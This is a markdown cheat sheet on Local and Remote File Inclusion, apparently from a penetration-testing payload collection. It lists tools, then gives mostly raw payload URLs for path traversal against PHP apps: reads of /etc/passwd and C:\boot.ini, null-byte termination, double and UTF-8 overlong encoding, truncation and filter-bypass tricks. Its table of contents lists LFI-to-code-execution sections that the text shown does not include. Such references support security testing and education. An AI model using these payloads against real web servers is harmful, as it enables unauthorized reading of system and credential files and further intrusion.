# Local File Inclusion and Remote File Inclusion

The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application.

The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application

***

## Summary
* [Tools](#tools)
* [Basic LFI](#basic-lfi)
    * [Linux Platform](#linux-platform)
    * [Windows Platform](#windows-platform)
    * [Null byte](#null-byte)
    * [Double encoding](#double-encoding)
    * [UTF-8 encoding](#utf-8-encoding)
    * [Path and dot truncation](#path-and-dot-truncation)
    * [Filter bypass tricks](#filter-bypass-tricks)
* [Basic RFI](#basic-rfi)
* [LFI / RFI using wrappers](#lfi--rfi-using-wrappers)
  * [Wrapper php://filter](#wrapper-phpfilter)
  * [Wrapper zip://](#wrapper-zip)
  * [Wrapper data://](#wrapper-data)
  * [Wrapper expect://](#wrapper-expect)
  * [Wrapper input://](#wrapper-input)
  * [Wrapper phar://](#wrapper-phar)
* [LFI to RCE via /proc/*/fd](#lfi-to-rce-via-procfd)
* [LFI to RCE via /proc/self/environ](#lfi-to-rce-via-procselfenviron)
* [LFI to RCE via upload](#lfi-to-rce-via-upload)
* [LFI to RCE via upload (race)](#lfi-to-rce-via-upload-race)
* [LFI to RCE via phpinfo()](#lfi-to-rce-via-phpinfo)
* [LFI to RCE via controlled log file](#lfi-to-rce-via-controlled-log-file)
* [LFI to RCE via PHP sessions](#lfi-to-rce-via-php-sessions)
* [LFI to RCE via credentials files](#lfi-o-rce-via-credentials-files)

***

## Tools

* [Kadimus - https://github.com/P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus)
* [LFISuite - https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)

***

## Basic LFI

Test about the same webpage content:
```
http://vulnerable.com/index.php?page=login.php
```


### Linux Platform

If target web server is reside on Linux platform, server path will be:

```
/var/www/html/yourImage.jpeg 
```

### Windows Platform

If target web server is reside on Windows platform, you can try:

```
http://example.com/index.php?file=C:\boot.ini 
```
```
http://example.com/index.php?file=../../C:\boot.ini
```

In the following examples we include the `/etc/passwd` file:
```
http://vulnerable.com/index.php?page=../../../etc/passwd
```

### Null byte

:warning: In versions of PHP below 5.3.4 we can terminate with null byte.

```
http://vulnerable.com/index.php?page=../../../etc/passwd%00
```

### Double encoding

```
http://vulnerable.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://vulnerable.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### UTF-8 encoding

```
http://vulnerable.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://vulnerable.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

### Path and dot truncation

On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away.

```
http://vulnerable.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://vulnerable.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://vulnerable.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://vulnerable.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```

### Filter bypass tricks

```
http://vulnerable.com/index.php?page=....//....//etc/passwd
http://vulnerable.com/index.php?page=..///////..////..//////etc/passwd
http://vulnerable.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

### Legit File Load

When a file load correctly, can try the LFI attached to this:
```
http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd
http://vulnerable/images/myimages.php?var=folder/image.png../../../../../../../etc/passwd
```

***
